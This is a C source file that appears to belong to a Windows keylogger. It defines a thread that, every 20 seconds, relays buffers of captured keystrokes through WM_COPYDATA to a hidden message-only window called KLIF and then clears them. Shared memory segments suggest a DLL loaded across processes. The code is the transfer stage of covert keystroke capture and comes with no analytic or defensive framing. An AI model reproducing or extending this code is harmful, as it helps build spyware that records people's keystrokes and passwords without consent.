//* Running in DataTransfer Thread.

#include "..\..\..\Include\Keylog.h"

extern	CRITICAL_SECTION	csLinkList;
extern	HINSTANCE			hInstance;
extern	KLTEMPDATA			*pStartNode;
extern	BOOL				bKLExitReadConfigThread;

#pragma data_seg( "SharedSegment" )
extern BOOL	bKLExitAllReadConfigThread;
#pragma data_seg()
#pragma comment ( linker, "/SECTION:SharedSegment,RWS" )

DWORD WINAPI TransferLinkListData(LPVOID lParam)
{
    HMODULE hMod = NULL;
    if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCWSTR)TransferLinkListData, &hMod))
    {
        return GetLastError();
    }

    while (bKLExitAllReadConfigThread != TRUE && bKLExitReadConfigThread != TRUE)
    {
        // send data to KLIF after every 20 seconds..
        Sleep(20000);
        if (bKLExitAllReadConfigThread != TRUE && bKLExitReadConfigThread != TRUE)
            StartTransfer();
    }

    FreeLibraryAndExitThread(hMod, ERROR_SUCCESS);
    return ERROR_SUCCESS; // unreachable code
}

BOOL StartTransfer()
{
    KLTEMPDATA *pCurNode = NULL;
    COPYDATASTRUCT cdsLinkList;
    HRESULT hResult = 0;

    HWND hKLIFWnd = NULL;
    hKLIFWnd = FindWindowEx(HWND_MESSAGE, NULL, KLIF_WND_CLASS_NAME, KLIF_WND_TITLE);
    if (hKLIFWnd == NULL)
        return FALSE;

    EnterCriticalSection(&csLinkList);

    pCurNode = pStartNode;

    while (pCurNode != NULL)
    {
        if (pCurNode->KeyCount == 0)
        {
            pCurNode = pCurNode->pNextLink;
            continue;
        }

        cdsLinkList.dwData = KL_TEMP_LINKLIST_DATA;
        cdsLinkList.cbData = sizeof(KLTEMPDATA);
        cdsLinkList.lpData = pCurNode;

        hResult = SendMessage(hKLIFWnd, WM_COPYDATA, (WPARAM)(HWND)hInstance, (LPARAM)(LPVOID)&cdsLinkList);

        pCurNode->KeyCount = 0;							// reset
        pCurNode->KeysBufferLength = 0;					// reset
        wcscpy_s(pCurNode->Keys, MAX_KL_KEYS, L"");	// reset

        pCurNode = pCurNode->pNextLink;
    }

    LeaveCriticalSection(&csLinkList);

    return TRUE;
}
